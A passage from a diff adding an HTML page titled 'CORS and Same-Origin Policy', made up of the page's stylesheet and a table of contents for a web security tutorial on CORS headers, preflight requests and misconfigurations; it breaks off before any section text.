@@ -1,0 +1,1226 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CORS and Same-Origin Policy</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2b4562ad-76f0-80f8-ad78-f18ee1bc5c7d" class="page mono"><header><h1 class="page-title" dir="auto"><strong>CORS and Same-Origin Policy</strong></h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2b4562ad-76f0-8006-b2cb-f742c9084b56" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-804a-9e00-c041e1a7e08a"><strong>Introduction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80d3-a3a3-fcf9452ebbce"><strong>What is an Origin?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-800b-940d-e0d6edf9290c"><strong>Why Do We Need SOP and CORS?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-806c-a772-e453bcb2c8f7"><strong>Same-Origin Policy (SOP)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-804b-874a-f3397477131c"><strong>Definition</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-800e-a0cb-d7d301cfddaa"><strong>What SOP Restricts</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-803b-8c3b-d1100ae1e1c3"><strong>What SOP Does NOT Restrict</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8051-8b42-deb8d0893351"><strong>Why SOP Exists</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8086-b5a7-c3373e1c533d"><strong>SOP Exceptions</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-80fb-bcd6-da287a6c3a1f"><strong>Cross-Origin Resource Sharing (CORS)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8056-ac7d-dba1b2255639"><strong>Definition</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80cc-a013-cf0f53872ab2"><strong>How CORS Works</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8089-803f-c1cb0881ec80"><strong>Important: CORS is Browser-Enforced</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-8083-9657-d9e68d906cbc"><strong>CORS Headers Explained</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8039-a378-de26df5a19ad"><strong>Request Headers (Sent by Browser)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8063-b30e-e82a99bbcdec"><strong>Origin</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80f8-a3dd-dfb4975e45d3"><strong>Access-Control-Request-Method</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-804b-b780-d2b5f3cb0f6c"><strong>Access-Control-Request-Headers</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80a0-8df6-d66ec681b799"><strong>Response Headers (Sent by Server)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8072-866d-eb4b59210cbc"><strong>Access-Control-Allow-Origin</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80d4-bff3-e2f981e72cbf"><strong>Access-Control-Allow-Methods</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8035-9167-f0e272930305"><strong>Access-Control-Allow-Headers</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80c5-a276-d3ea16bb8152"><strong>Access-Control-Allow-Credentials</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80ec-8e84-d9f4f1a33898"><strong>Access-Control-Expose-Headers</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8050-a814-ea002710b105"><strong>Access-Control-Max-Age</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-8081-aa6e-f47bf9261b64"><strong>Simple vs Preflight Requests</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8019-aed0-d07dd508c753"><strong>Simple Requests</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80c9-ac19-d3681599f16e"><strong>Preflight Requests</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-80a7-a941-c6f1975a92b8"><strong>CORS with Credentials</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8046-a85c-c3db06454162"><strong>What are Credentials?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80b5-ba14-feec913b84fd"><strong>Enabling Credentials</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8056-8926-d99a63231053"><strong>Critical Rule: No Wildcard with Credentials</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80e7-a92e-f7960ed6d1b0"><strong>Credentials Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-808e-9b1d-fe6eb09bd47e"><strong>Common CORS Vulnerabilities</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8079-a23f-c8ca7618b11a"><strong>1. Wildcard with Credentials</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8094-adab-e72eb8a56982"><strong>2. Origin Reflection Without Validation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-808b-9ae2-f67dd22be549"><strong>3. Overly Permissive Methods</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8048-a9ee-e544a94a5de5"><strong>4. Overly Permissive Headers</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-806e-8e7e-c7b120673485"><strong>5. Missing Preflight Validation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-802b-85c7-eedb59288e92"><strong>6. Subdomain Wildcard Abuse</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-80f5-84b7-e8afd369edc4"><strong>Secure CORS Implementation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80c2-97b3-f9fc02f7b6de"><strong>Node.js/Express</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8019-9f53-e47dbdbee783"><strong>Python/Flask</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8023-bd1b-f6667a87fa81"><strong>Python/Flask (Manual Implementation)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-809b-a3ac-cabdca016d6e"><strong>PHP</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-809f-a75e-c823f7851587"><strong>Java/Spring Boot</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8074-866d-ee64d753970d"><strong>C#/ASP.NET Core</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-803e-b579-f75ee4468c55"><strong>Nginx Configuration</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-80e0-aa7b-d24429f3c560"><strong>Testing CORS Configuration</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-808e-a37e-f3dd076e5a20"><strong>Manual Testing with curl</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80cf-bb7f-d217c9dd99a2"><strong>Browser Testing</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-804c-bf68-ce37de0dee55"><strong>Automated Testing Tools</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-8082-89a4-c843f559ddc7"><strong>Real-World Scenarios</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-802c-8840-d389f26ebd30"><strong>Scenario 1: Public API (No Credentials)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80c3-9f81-cead0669bc17"><strong>Scenario 2: Authenticated API (With Credentials)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8035-9f78-fd12dea3853a"><strong>Scenario 3: Multi-Origin Support</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-80bb-8a0c-e2454841b1e5"><strong>Scenario 4: Development vs Production</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8048-adc4-fb8f42f869d2"><strong>Scenario 5: Third-Party Widget Integration</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-80f2-90e6-db6c1cd4f3ed"><strong>Summary</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-809b-87c6-cabf8b3d381a"><strong>Key Takeaways</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-805a-bb33-d52fb99f20f9"><strong>Best Practices</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b4562ad-76f0-8019-8551-e892ec28c461"><strong>Remember</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b4562ad-76f0-803d-99c4-e9e7e77cce0b"><strong>Next Steps</strong></a></div></nav></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8002-8088-f6fa7773c699"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-804a-9e00-c041e1a7e08a" class=""><strong>Introduction</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80d3-a3a3-fcf9452ebbce" class=""><strong>What is an Origin?</strong></h3></div><div style="display:contents" dir="auto"><p 